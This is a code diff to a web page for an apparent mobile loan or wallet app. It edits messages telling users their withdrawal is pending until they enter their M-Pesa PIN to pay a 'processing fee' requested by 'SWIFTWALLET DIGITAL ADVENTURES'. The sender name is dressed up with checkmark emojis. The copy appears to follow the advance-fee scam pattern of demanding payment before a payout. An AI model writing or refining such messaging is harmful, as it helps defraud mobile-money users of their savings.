@@ -1390,7 +1390,7 @@
                 'bank': 'fas fa-university'
             };
 
-            const message = `Your withdrawalis initiatedsuccessfully! Check your phone for the M-Pesa payment request from <span class="text-red-600 font-bold">✔️SWIFTWALLET DIGITAL ADVENTURES✔️</span>. Enter your M-Pesa PIN to complete the fee payment requested to complete withdrawal .Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING APPROVAL</span> after fee payment confirmation.`;
+            const message = `Your withdrawal is initiated successfully! Check your phone (${loanData.phone}) for the M-Pesa payment request from <span class="text-red-600 font-bold">✔️SWIFTWALLET DIGITAL ADVENTURES✔️</span>. Enter your M-Pesa PIN to complete the fee payment requested to complete withdrawal .Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING APPROVAL</span> after fee payment confirmation.`;
 
             // Update success message
             document.getElementById('successMessage').innerHTML = message;
@@ -1490,7 +1490,7 @@
             if (feePaymentInitiated === 'true') {
                 const withdrawalMethod = localStorage.getItem('swift_withdrawal_method') || 'M-Pesa';
                 showSuccess(
-                    `Complete previous request to (${loanData.phone}) by clicking withdraw button  below .STK Push was sent from SWIFTWALLET DIGITAL ADVENTURES for the requested processing fee. Please complete the fee payment to process your ${withdrawalMethod} withdrawal. Status: <span class="text-orange-600 font-bold">PENDING APPROVAL</span>`
+                    `Complete previous request sent to (${loanData.phone}) by clicking withdraw button  below .STK Push was sent from SWIFTWALLET DIGITAL ADVENTURES for the requested processing fee. Please complete the fee payment to process your ${withdrawalMethod} withdrawal. Status: <span class="text-orange-600 font-bold">PENDING APPROVAL</span>`
                 );
                 updateDisbursementTimeline(true);
             }
